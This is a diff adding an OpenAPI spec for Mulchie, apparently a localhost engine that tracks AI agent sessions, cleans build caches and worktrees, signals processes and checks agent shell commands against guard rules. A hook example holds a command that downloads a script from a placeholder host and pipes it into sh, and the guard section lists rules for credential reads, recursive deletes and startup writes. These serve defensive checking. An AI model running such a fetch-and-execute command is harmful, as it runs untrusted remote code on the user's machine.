@@ -1,0 +1,1231 @@
+openapi: 3.1.0
+info:
+  title: Mulchie local API
+  version: 0.3.0
+  summary: The engine's HTTP API on 127.0.0.1, for the CLI, the app, the MCP server and scripts.
+  description: |
+    The engine (the menu bar app or `mulchie serve`) listens on 127.0.0.1 only, on the
+    port in `api_port` (default 47474; `MULCHIE_PORT` overrides it for one process). The
+    port in use is recorded in the engine lock file.
+
+    Authentication: every route except `GET /v1/health` needs `Authorization: Bearer <token>`.
+    - The full token is in `<config dir>/token` (`mulchie token` prints the path).
+    - A read-only token is in `<config dir>/token.read` (`mulchie token --read-only`). It is
+      accepted on every `GET` route, on `POST /v1/clean/plan`, `POST /v1/worktree/plan` and
+      `POST /v1/process/plan`, on `POST /v1/lease` (with `ttl_secs` and no `pid`) and
+      `POST /v1/release`, and on `POST /v1/hook` and `POST /v1/guard/check`; any other route
+      answers 403 `read_only_token`.
+    Both files are mode 0600 in a 0700 directory; a token file with looser permissions is refused.
+
+    Requests must send `Host: 127.0.0.1:<port>` or `localhost:<port>` and no `Origin` header,
+    so web pages cannot drive the API. Limits: request line 8 KB, headers 64 KB, body 1 MB,
+    10 s per request, 64 connections.
+
+    Deleting is plan-then-execute: get a plan (`GET /v1/sweep`, `GET|POST /v1/clean/plan`,
+    `POST /v1/worktree/plan`), show it, then post back the approved items' `request` objects
+    as `{"items": [...]}`. The engine's safety gate re-checks every item when it runs and
+    skips anything that changed.
+
+    This file is checked against the server's route table by
+    `cargo test -p mulchie --test discovery`.
+  license:
+    name: MIT
+servers:
+  - url: http://127.0.0.1:47474
+    description: The default port
+security:
+  - bearer: []
+paths:
+  /v1/health:
+    get:
+      summary: Liveness and a one-line summary
+      description: Needs no token.
+      security: []
+      responses:
+        "200":
+          description: The summary
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  name: { type: string, const: mulchie }
+                  version: { type: string }
+                  health: { $ref: "#/components/schemas/Health" }
+                  stale: { type: boolean }
+                  sample_age_secs: { type: [integer, "null"] }
+                  disk_free: { type: integer }
+                  disk_total: { type: integer }
+                  cpu_pct: { type: number }
+                  load: { type: array, items: { type: number } }
+                  mem_free_pct: { type: number }
+                  agents: { type: integer }
+                  builds: { type: integer }
+                  free_slots: { type: integer }
+                  ok_to_start_heavy_work: { type: boolean }
+                  reclaimable_stale: { type: integer }
+                  restarts: { type: integer }
+                  journal_error: { type: string, description: Why the action journal could not be written; absent when it can }
+                  journal_lost: { type: integer, description: "Journal entries that could not be written since the engine started. The first entry written after a failure is preceded by a `journal_gap` entry: \"journal gap: N entries lost between T1 and T2 (unix seconds)\"" }
+                  scan_age_secs: { type: [integer, "null"] }
+                  scan_stale: { type: boolean, description: The last scan is older than twice the scan interval plus 10 minutes }
+                  findings: { $ref: "#/components/schemas/FindingCounts" }
+                  sessions_running: { type: integer, description: Agent sessions running now }
+                  breaches_active: { type: integer, description: Limit breaches not yet cleared }
+                  updates_available: { type: integer, description: Open findings of category `update` }
+  /v1/state:
+    get:
+      summary: Everything the engine knows
+      description: |
+        The latest snapshot (machine figures, top processes, workspaces, `consumers` groups,
+        `cpu_summary` and `mem_summary` in words), health, config error, build slots, forecast,
+        last scan, disk map and recent actions. Also `journal_error`, `journal_lost`, `restore_failed`,
+        `scan_age_secs`, `scan_stale`, `findings` (as in `GET /v1/findings?dismissed=1`),
+        `finding_counts` and `findings_unix`, `sessions` (as `SessionsState`) and `updates`
+        (as `GET /v1/updates` without `report`). Command lines and lease labels are redacted.
+      responses:
+        "200": { $ref: "#/components/responses/Json" }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/history:
+    get:
+      summary: Samples from the last 30 minutes, every 3 seconds
+      responses:
+        "200": { $ref: "#/components/responses/Json" }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/advice:
+    get:
+      summary: Whether to start heavy work now, free slots and the suggested job count
+      responses:
+        "200": { $ref: "#/components/responses/Json" }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/scan:
+    post:
+      summary: Queue a scan for build caches and worktrees
+      responses:
+        "200":
+          description: Queued
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  ok: { type: boolean }
+                  queued: { type: boolean }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/clean/plan:
+    get:
+      summary: Plan deleting stale build caches
+      parameters:
+        - name: want_bytes
+          in: query
+          required: false
+          description: Stop once the plan would free this much
+          schema: { type: integer, minimum: 0 }
+      responses:
+        "200": { $ref: "#/components/responses/Plan" }
+        default: { $ref: "#/components/responses/Error" }
+    post:
+      summary: Plan deleting specific caches, or stale ones
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                paths: { type: array, items: { type: string } }
+                stale: { type: boolean }
+                want_bytes: { type: integer }
+      responses:
+        "200": { $ref: "#/components/responses/Plan" }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/clean:
+    post:
+      summary: Delete build caches
+      description: |
+        Send `{"items": [...]}`, the `request` objects of approved plan items (each must be
+        `delete_cache`). `{"paths": [...]}` deletes those cache directories directly (an
+        explicit list is its own approval), and `{"auto": true}` runs the automatic reclaim.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                items: { type: array, items: { $ref: "#/components/schemas/Request" } }
+                paths: { type: array, items: { type: string } }
+                auto: { type: boolean }
+                want_bytes: { type: integer }
+      responses:
+        "200": { $ref: "#/components/responses/Results" }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/sweep:
+    get:
+      summary: Plan removing idle agent worktrees
+      responses:
+        "200": { $ref: "#/components/responses/Plan" }
+        default: { $ref: "#/components/responses/Error" }
+    post:
+      summary: Remove approved idle agent worktrees
+      description: "Send `{\"items\": [...]}` from `GET /v1/sweep` (each `remove_worktree` or `prune_worktree`), or `{\"auto\": true}`."
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: "#/components/schemas/Items" }
+      responses:
+        "200": { $ref: "#/components/responses/Results" }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/worktree/plan:
+    post:
+      summary: Plan removing specific worktrees
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [paths]
+              properties:
+                paths: { type: array, items: { type: string } }
+                allow_dirty: { type: boolean, description: Save uncommitted changes as a patch and remove anyway }
+      responses:
+        "200": { $ref: "#/components/responses/Plan" }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/worktree/remove:
+    post:
+      summary: Remove approved worktrees
+      description: "Send `{\"items\": [...]}` from `POST /v1/worktree/plan`. Each item names the HEAD seen when planning; a worktree whose HEAD moved is skipped."
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: "#/components/schemas/Items" }
+      responses:
+        "200": { $ref: "#/components/responses/Results" }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/prune:
+    post:
+      summary: Run a package manager's own prune command
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [key]
+              properties:
+                key: { type: string, description: "npm, bun, pnpm, yarn, uv, pip, homebrew, go or simulators" }
+      responses:
+        "200": { $ref: "#/components/responses/Json" }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/workspace:
+    post:
+      summary: Act on a workspace's processes owned by the current user
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [path, action]
+              properties:
+                path: { type: string }
+                action: { type: string, enum: [pause, resume, deprioritize, stop_builds, kill_all] }
+                pids:
+                  description: The previewed processes. When given, only these are acted on, each only if it still has this start time; the reply then has `results`.
+                  type: array
+                  items:
+                    type: object
+                    required: [pid, expected_start_time]
+                    properties:
+                      pid: { type: integer }
+                      expected_start_time: { type: integer }
+      responses:
+        "200":
+          description: Done
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  ok: { type: boolean }
+                  processes: { type: integer }
+                  results: { type: array, items: { $ref: "#/components/schemas/ActionResult" } }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/process:
+    post:
+      summary: Signal or renice one process owned by the current user
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [pid, action]
+              properties:
+                pid: { type: integer }
+                action: { type: string, enum: [term, kill, stop, cont, renice] }
+                nice: { type: integer, description: For renice }
+                expected_start_time:
+                  type: integer
+                  description: "The start time the caller saw. With it, a different process at this pid is skipped and the reply is `{\"ok\": false, \"result\": ActionResult}` with status 200."
+      responses:
+        "200": { $ref: "#/components/responses/Json" }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/process/plan:
+    post:
+      summary: Plan acting on a process, a process tree or a consumer group
+      description: |
+        Either `pid` (with `signal`, default `term`, and `tree` for its descendants, deepest first)
+        or `group` (a key from `snapshot.consumers.groups`) with `action`. Each item's `request`
+        carries the start time seen now; send the ready ones to `POST /v1/process/execute`.
+        Or `session` (an id from `GET /v1/sessions`) with `action`: the session's processes,
+        without the agent itself unless `include_agent`.
+        A plan that would signal the engine, `caller_pid` or any of their ancestors is refused
+        (`protected`), for `pid`, `tree`, `group` and `session` alike. The engine cannot see who
+        calls it over HTTP: only a client that sends `caller_pid` (its own pid) gets itself, its
+        shell, terminal and agent protected. Without it, only the engine and its ancestors are.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                pid: { type: integer }
+                signal: { type: string, enum: [term, kill, stop, cont] }
+                tree: { type: boolean }
+                group: { type: string }
+                action: { type: string, enum: [quit, force_quit, pause, resume, lower_priority, stop_builds, restart] }
+                caller_pid: { type: integer, description: "The calling process's own pid; send it so the caller and its ancestors are never planned" }
+                session: { type: string, description: A session id; plans its processes }
+                include_agent: { type: boolean, description: "With `session`, also the agent process at its root" }
+      responses:
+        "200":
+          description: The plan; nothing was changed
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  created_unix: { type: integer }
+                  target: { type: string }
+                  name: { type: string }
+                  action: { type: string }
+                  ready: { type: boolean }
+                  refused: { type: string, enum: [protected, unknown_group, unknown_pid, unknown_session, restart_unavailable, no_builds, invalid_request] }
+                  detail: { type: string }
+                  items:
+                    type: array
+                    items:
+                      type: object
+                      properties:
+                        request: { $ref: "#/components/schemas/Request" }
+                        ready: { type: boolean }
+                        reason: { type: [string, "null"] }
+                  affected:
+                    type: array
+                    items:
+                      type: object
+                      properties:
+                        pid: { type: integer }
+                        name: { type: string }
+                        start_time: { type: integer }
+                        how: { type: string, enum: [signalled, exits_with_app, reniced] }
+                  restart: { type: string }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/process/execute:
+    post:
+      summary: Run approved process requests from a plan
+      description: "Send `{\"items\": [...]}`, the `request` objects (signal, renice or reopen_app) of approved items from `POST /v1/process/plan`. Each is re-checked; a pid with a different start time is skipped. A reopen_app runs only when a signal earlier in the same request quit that pid and the process belonged to that bundle id; otherwise it is skipped with `reopen_not_quit`."
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: "#/components/schemas/Items" }
+      responses:
+        "200": { $ref: "#/components/responses/Results" }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/process/{pid}:
+    get:
+      summary: Everything known about one process
+      description: |
+        Read now. argv is redacted, and empty (with `cwd` null) for other users' processes.
+        `listening` comes from the last watch run (`listening_unix`) and is null when unknown;
+        `signature` is set once the watch has checked the executable (macOS).
+      parameters:
+        - name: pid
+          in: path
+          required: true
+          schema: { type: integer, minimum: 0 }
+      responses:
+        "200":
+          description: The process
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  pid: { type: integer }
+                  ppid: { type: integer }
+                  name: { type: string }
+                  own: { type: boolean }
+                  exe: { type: [string, "null"] }
+                  cmd: { type: array, items: { type: string } }
+                  cwd: { type: [string, "null"] }
+                  workspace: { type: [string, "null"] }
+                  workspace_label: { type: [string, "null"] }
+                  group: { type: [string, "null"] }
+                  kind: { type: [string, "null"], enum: [agent, build, runtime, other, null] }
+                  start_time: { type: integer }
+                  age_secs: { type: [integer, "null"] }
+                  cpu_pct: { type: [number, "null"] }
+                  mem_bytes: { type: [integer, "null"] }
+                  stopped: { type: boolean }
+                  parents: { type: array, items: { type: object, properties: { pid: { type: integer }, name: { type: string } } } }
+                  children: { type: array, items: { type: object, properties: { pid: { type: integer }, name: { type: string }, start_time: { type: integer } } } }
+                  listening: { type: [array, "null"], items: { type: string } }
+                  listening_unix: { type: [integer, "null"] }
+                  signature: { type: [string, "null"], enum: [apple, app_store, developer_id, development, other_signed, ad_hoc, unsigned, unknown, null] }
+                  quarantined: { type: [boolean, "null"] }
+                  protected: { type: [string, "null"] }
+                  findings: { type: array, items: { $ref: "#/components/schemas/Finding" } }
+        "400": { $ref: "#/components/responses/Error" }
+        "404": { $ref: "#/components/responses/Error" }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/findings:
+    get:
+      summary: What the watch detectors found
+      description: |
+        Observations, not verdicts: leftover, runaway, exposed or oddly placed processes, and
+        problems with Mulchie's own setup. No malware detection, no network lookups. Updated
+        on the scan loop every `watch.interval_secs`. Dismissed findings are left out unless
+        `dismissed=1`.
+      parameters:
+        - { name: severity, in: query, required: false, description: Minimum severity, schema: { type: string, enum: [info, low, medium, high] } }
+        - { name: kind, in: query, required: false, schema: { $ref: "#/components/schemas/FindingKind" } }
+        - { name: dismissed, in: query, required: false, schema: { type: string, enum: ["1", "true"] } }
+      responses:
+        "200":
+          description: The findings, most severe first
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  findings: { type: array, items: { $ref: "#/components/schemas/Finding" } }
+                  counts: { $ref: "#/components/schemas/FindingCounts" }
+                  updated_unix: { type: [integer, "null"] }
+                  enabled: { type: boolean }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/findings/dismiss:
+    post:
+      summary: Hide a finding for a number of days
+      description: Saved in the config (`watch.dismissed`). Refused with `config_not_loaded` while the config file is broken.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [id]
+              properties:
+                id: { type: string }
+                days: { type: integer, minimum: 1, maximum: 3650, default: 30 }
+      responses:
+        "200":
+          description: Dismissed
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  ok: { type: boolean }
+                  id: { type: string }
+                  until_unix: { type: integer }
+                  known: { type: boolean, description: "The id names a current finding or one dismissed before; false is probably a typo (the dismissal is saved anyway)" }
+        "409": { $ref: "#/components/responses/Error" }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/findings/undismiss:
+    post:
+      summary: Show a dismissed finding again
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [id]
+              properties:
+                id: { type: string }
+      responses:
+        "200":
+          description: Done
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  ok: { type: boolean }
+                  id: { type: string }
+                  was_dismissed: { type: boolean }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/config:
+    get:
+      summary: The config in use, why the file was not used (if so), and its path
+      responses:
+        "200":
+          description: The config
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  config: { type: object }
+                  revision:
+                    type: string
+                    description: >-
+                      The revision of the config file's content (16 hex digits). Send it back as
+                      `If-Match` or `if_revision` on PUT or PATCH to write only if nothing changed
+                      the file since.
+                  config_error: { type: [string, "null"] }
+                  path: { type: string }
+        default: { $ref: "#/components/responses/Error" }
+    put:
+      summary: Replace the config
+      description: |
+        Send `{"config": {...}}`, the whole config from `GET /v1/config` with your changes;
+        fields left out take their defaults. Validated (400 `invalid_config`) and saved
+        atomically; a file that failed to load is moved aside, not overwritten. Full token only.
+        When the file changed on disk since the engine loaded or wrote it (another engine, an
+        editor), nothing is saved: 409 `config_changed`, and the engine takes the file's
+        content. Read the config again and reapply the change. Dismissing or undismissing a
+        finding instead applies its edit to the file's current content. Only the engine that
+        holds the engine lock writes the config: any other answers 409 `not_lock_holder`.
+        A key the config does not have is 400 `unknown_key`, naming its path (for example
+        `guard.rulez`); nothing is saved.
+        With a revision (`If-Match` header, quoted or not, or the `if_revision` query parameter)
+        that is not the file's content now, nothing is saved: 409 `config_changed`.
+        Prefer `PATCH`, which sends only the keys that change.
+      parameters:
+        - { $ref: "#/components/parameters/IfMatch" }
+        - { $ref: "#/components/parameters/IfRevision" }
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [config]
+              properties:
+                config: { type: object }
+      responses:
+        "200":
+          description: Saved and applied
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  ok: { type: boolean }
+                  config: { type: object }
+                  revision: { type: string, description: The revision of the file as saved }
+        "409": { $ref: "#/components/responses/Error" }
+        default: { $ref: "#/components/responses/Error" }
+    patch:
+      summary: Change some config keys
+      description: |
+        The body is a JSON merge patch (RFC 7396) of the config: objects merge key by key, `null`
+        removes a key so it takes its default, anything else (arrays included) replaces. It is
+        applied to the config file's current content under the config lock (an edit made
+        elsewhere is kept, not refused), validated (400 `invalid_config`) and saved atomically.
+        A file that failed to load is not patched (400; replace it with `PUT`). Full token only;
+        409 `not_lock_holder` on an engine that does not hold the engine lock.
+        A key the config does not have, at any depth, is 400 `unknown_key` naming its path
+        (`watch.intervl_secs`, `limits.workspaces[0].budget.bogus`); keys set to null are not
+        checked. Nothing is saved.
+        With a revision (`If-Match` header or `if_revision`) that is not the file's content now,
+        nothing is saved: 409 `config_changed`. Without one the patch applies to whatever the
+        file holds.
+      parameters:
+        - { $ref: "#/components/parameters/IfMatch" }
+        - { $ref: "#/components/parameters/IfRevision" }
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { type: object }
+            example: { "watch": { "interval_secs": 120 }, "limits": { "default": null } }
+      responses:
+        "200":
+          description: Saved and applied; the whole config now in use
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  ok: { type: boolean }
+                  config: { type: object }
+                  revision: { type: string, description: The revision of the file as saved }
+        "409": { $ref: "#/components/responses/Error" }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/lease:
+    post:
+      summary: Join the build queue, poll a ticket, or renew a slot
+      description: |
+        A lease needs a live `pid`, a `ttl_secs`, or both. Poll with the returned `ticket` until
+        `granted`. The reply that creates a ticket carries `release_secret`, which only that caller
+        sees; keep it for `POST /v1/release`. The read-only token may take a lease only with
+        `ttl_secs` and no `pid` (403 `read_only_token` otherwise). A `pid` of 0 or 1, another
+        user's process or a dead one is refused with `pid_not_allowed`. Labels are redacted.
+        Renewing or polling a ticket needs its `secret` (403 `release_secret_required` without it,
+        403 `wrong_release_secret` with another). A renewal never shortens a lease's expiry and
+        never adds a TTL to a pid lease.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                label: { type: string }
+                pid: { type: integer }
+                ticket: { type: integer }
+                ttl_secs: { type: integer, minimum: 1, maximum: 86400 }
+                secret: { type: string, description: "With `ticket`, the `release_secret` from the reply that created it" }
+      responses:
+        "200":
+          description: The ticket's state
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  granted: { type: boolean }
+                  ticket: { type: integer }
+                  jobs: { type: integer }
+                  position: { type: integer }
+                  reason: { type: string }
+                  expires_unix: { type: [integer, "null"] }
+                  release_secret: { type: string, description: Only on the reply that created the ticket }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/release:
+    post:
+      summary: Release a slot or leave the queue
+      description: >-
+        With the read-only token, a lease with a release secret needs it; without it the reply is
+        403 `release_secret_required`. With the full token and no `secret`, any lease or waiter is
+        released (an admin release, for a holder that crashed with its secret); it is journaled as
+        such and the reply has `admin: true`. A wrong secret is always 403 `wrong_release_secret`.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [ticket]
+              properties:
+                ticket: { type: integer }
+                secret: { type: string, description: The `release_secret` from the reply that created the ticket }
+      responses:
+        "200":
+          description: Released
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  released: { type: boolean }
+                  admin: { type: boolean, description: "Released by the full token without the secret (present only when no secret was sent with the full token)" }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/sessions:
+    get:
+      summary: Agent sessions, running first, newest first
+      description: |
+        A session is an agent process and everything it started, keyed `s-<start time>-<pid>`.
+        Sessions are found from the process table on each sample (`source: detected`) or
+        registered by `POST /v1/hook` (`source: hook`). Ended sessions are kept for a while.
+        `write_bytes_available` says whether per-process disk writes can be read on this system.
+      responses:
+        "200":
+          description: The sessions
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  enabled: { type: boolean, description: "`sessions.enabled` in config" }
+                  write_bytes_available: { type: boolean }
+                  sessions: { type: array, items: { $ref: "#/components/schemas/Session" } }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/sessions/{id}:
+    get:
+      summary: One session with its processes, breaches and paused processes
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string, pattern: "^s-[0-9]+-[0-9]+$" } }
+      responses:
+        "200":
+          description: The session
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  session: { $ref: "#/components/schemas/Session" }
+                  processes:
+                    type: array
+                    description: Members at the last sample. Command lines are redacted.
+                    items:
+                      type: object
+                      properties:
+                        pid: { type: integer }
+                        ppid: { type: integer }
+                        start_time: { type: integer }
+                        name: { type: string }
+                        cmd: { type: string }
+                        cpu_pct: { type: number }
+                        mem_bytes: { type: integer }
+                        stopped: { type: boolean }
+                        root: { type: boolean }
+                  breaches: { type: array, items: { $ref: "#/components/schemas/Breach" } }
+                  paused_by_mulchie: { type: array, items: { $ref: "#/components/schemas/PausedProc" } }
+        "400": { description: "`invalid_session_id`", content: { application/json: { schema: { type: object } } } }
+        "404": { description: "`unknown_session`", content: { application/json: { schema: { type: object } } } }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/sessions/{id}/events:
+    get:
+      summary: A session's activity record
+      description: |
+        Events with `seq` above `since`, oldest first, from `<config dir>/sessions/`. Written only
+        by the engine holding the lock, and only while `sessions.enabled`. Every command line and
+        hook payload is redacted before it is stored. Pass `next_since` back as `since` to page.
+        A session that is neither known nor recorded is 404 `unknown_session`.
+
+        Every limit action is a `limit_action` event: `breach_id`, `cap`, `action` (the cap's
+        action), `outcome` (`paused`, `stopped`, `killed`, `deprioritized`, `resumed`, `restored`,
+        `restore_failed` or `refused`), `state` (the breach's `action_state`), `detail`, and
+        `reason` when refused. `cap`, `action` and `state` are null for a resume whose breach is
+        gone (sessions or limits were turned off).
+
+        To read backwards, pass `tail=N` for the last N events, then `before=<prev_before>` for
+        the page before that; events are still oldest first. `prev_before` is null when the page
+        starts at the first event. `before` without `tail` takes `limit` events. `since` does not
+        combine with `tail` or `before` (400 `invalid_query`).
+
+        A read waits for events still queued for the writer at most 250 ms, and seeks through an
+        index of byte offsets (one per 128 events), so it never reads the record from the start.
+        A record that is a symlink, FIFO or hard link is refused (500 `record_unreadable`).
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string, pattern: "^s-[0-9]+-[0-9]+$" } }
+        - { name: since, in: query, required: false, schema: { type: integer, minimum: 0, default: 0 } }
+        - { name: limit, in: query, required: false, schema: { type: integer, minimum: 1, maximum: 1000, default: 200 } }
+        - { name: tail, in: query, required: false, description: The last N events (below `before` when given), schema: { type: integer, minimum: 1, maximum: 1000 } }
+        - { name: before, in: query, required: false, description: Only events with `seq` below this, schema: { type: integer, minimum: 1 } }
+      responses:
+        "200":
+          description: The events
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  session_id: { type: string }
+                  next_since: { type: integer }
+                  prev_before:
+                    type: [integer, "null"]
+                    description: "`before` for the page of older events; null at the start of the record"
+                  events:
+                    type: array
+                    items:
+                      type: object
+                      required: [seq, t, type]
+                      properties:
+                        seq: { type: integer }
+                        t: { type: integer, description: Unix seconds }
+                        type: { type: string, description: "e.g. session_start, session_end, breach, limit_action, hook_prompt, hook_pre_tool" }
+        "400": { description: "`invalid_session_id` or `invalid_query`", content: { application/json: { schema: { type: object } } } }
+        "404": { description: "`unknown_session`", content: { application/json: { schema: { type: object } } } }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/limits/status:
+    get:
+      summary: Session budgets, breaches, hogs and processes Mulchie paused
+      description: |
+        `report_only` is true when no cap acts (every action is `notify`). `enforcing` is false
+        on an engine that does not hold the lock: it reports and never acts. Every limit action
+        goes through the safety gate with the start time that was observed, and is journaled.
+      responses:
+        "200":
+          description: The status
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  report_only: { type: boolean }
+                  enforcing: { type: boolean }
+                  not_enforcing_reason:
+                    type: string
+                    enum: [not_lock_holder, config_error]
+                    description: >-
+                      Present when `enforcing` is false. `not_lock_holder`: another engine holds
+                      the engine lock (it acts; this one reports). `config_error`: the config file
+                      did not load, so nothing acts until it is fixed.
+                  config: { type: object, description: The `limits` section of config }
+                  breaches: { type: array, items: { $ref: "#/components/schemas/Breach" } }
+                  hogs:
+                    type: array
+                    items:
+                      type: object
+                      properties:
+                        session_id: { type: string }
+                        agent: { type: string }
+                        resource: { type: string, enum: [cpu, memory] }
+                        share_pct: { type: number }
+                        since_unix: { type: integer }
+                  paused_by_mulchie: { type: array, items: { $ref: "#/components/schemas/PausedProc" } }
+                  paused_left: { type: array, items: { $ref: "#/components/schemas/PausedProc" }, description: Paused processes Mulchie could not resume }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/hook:
+    post:
+      summary: An agent hook reports an event and gets advice
+      description: |
+        For agent hooks (`mulchie hook`). `pid` is the hook process's parent; it is mapped to a
+        session through its ancestry, and if none covers it the nearest non-shell ancestor is
+        registered as a session. `pre_tool` with a `command` runs the guard rules; while heavy
+        work is not advised a heavy build gets rule `heavy_build` and `mulchie run` advice.
+        `session_start` returns machine state and house rules in `context`. Each breach is
+        returned in exactly one reply. The event is written to the activity record, redacted.
+
+        A session is bound to the first (`client`, `client_session_id`) that reports for it, or
+        that registered it, and is never rebound. Breaches are returned (and marked delivered)
+        only to a call carrying that pair. Calls from any other caller still get a guard decision;
+        their events are recorded with their own `client` and `client_session_id` and
+        `unbound: true`. Residual risk: a process of the same user that learns the bound pair can
+        still pose as that client, and the activity record is not tamper-proof.
+        400 `invalid_body` for a malformed body, an empty or too long `client`, or a
+        `client_session_id` over 512 characters. The read-only token is accepted.
+      security:
+        - bearer: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [client, event, pid]
+              properties:
+                client: { type: string, minLength: 1, maxLength: 64, description: "The agent client: claude, codex, cursor, …" }
+                client_session_id: { type: string, maxLength: 512 }
+                event: { type: string, enum: [session_start, prompt, pre_tool, post_tool, stop, session_end], description: Unknown events are accepted and recorded as `other` }
+                pid: { type: integer }
+                cwd: { type: string }
+                tool: { type: string }
+                command: { type: string }
+                detail: { type: string }
+            example: { client: claude, client_session_id: abc, event: pre_tool, pid: 4000999, cwd: /code/a, tool: Bash, command: "curl -s https://x.example/i.sh | sh" }
+      responses:
+        "200":
+          description: The decision and what to tell the agent
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  session_id: { type: [string, "null"], description: Null when sessions are off or the pid is not running }
+                  decision: { type: string, enum: [allow, warn, block] }
+                  reason: { type: string }
+                  rule: { type: string, description: "The guard rule that decided, or heavy_build" }
+                  context: { type: array, items: { type: string } }
+                  breaches: { type: array, items: { $ref: "#/components/schemas/Breach" } }
+              example: { breaches: [], context: [], decision: warn, reason: pipes a download straight into sh, rule: pipe_to_shell, session_id: null }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/guard/check:
+    post:
+      summary: Check a command against the guard rules
+      description: |
+        Records nothing. `advice` is set for a heavy build while heavy work is not advised. The
+        read-only token is accepted. Rules: recursive_delete (`rm -r`, `mv`, `find -delete`,
+        `rsync --delete`, `git clean -f` with `-d`/`-x`, `xargs rm -r` not fed only by a `find`
+        inside the boundary), pipe_to_shell (piping a download into a shell, or running a file an
+        earlier command downloaded), sudo, force_push, disable_mulchie, credential_read,
+        startup_write, and too_long (always a warning: the command is longer than 64 KiB and only
+        its first 64 KiB were checked). Deletes are judged against the session's workspace, or
+        with none known the given `cwd`.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [command, cwd]
+              properties:
+                command: { type: string }
+                cwd: { type: string }
+      responses:
+        "200":
+          description: The verdict
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  decision: { type: string, enum: [allow, warn, block] }
+                  reason: { type: string }
+                  rule: { type: string }
+                  matches:
+                    type: array
+                    items:
+                      type: object
+                      properties:
+                        rule: { type: string }
+                        mode: { type: string, enum: [allow, warn, block] }
+                        reason: { type: string }
+                  advice: { type: string }
+        default: { $ref: "#/components/responses/Error" }
+  /v1/updates:
+    get:
+      summary: Update checks and their last result
+      description: |
+        Checks run only on the engine holding the lock: the first no sooner than 5 minutes after
+        start, then every `updates.interval_hours`, sooner after errors. Sources: the Mulchie
+        release on GitHub, agent tools' versions against npm, Homebrew's local data, and OSV.dev for
+        packages in workspace lockfiles. With `updates.check: off` nothing is requested or run.
+        Agent tools are looked for in absolute `PATH` directories outside the workspaces and scan
+        roots and are never run: their installed version comes from package metadata. `brew
+        outdated` runs with a minimal `PATH`, `HOMEBREW_NO_AUTO_UPDATE=1` and
+        `HOMEBREW_NO_INSTALL_FROM_API=1`, and only when the local homebrew/core tap exists.
+      responses:
+        "200":
+          description: The status
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  enabled: { type: boolean }
+                  checking: { type: boolean }
+                  checked_unix: { type: [integer, "null"] }
+                  next_check_unix: { type: [integer, "null"] }
+                  failures: { type: integer, description: Consecutive checks with errors }
+                  available: { type: integer, description: Open findings of category `update` }
+                  errors: { type: array, items: { type: string } }
+                  report:
+                    type: object
+                    description: >-
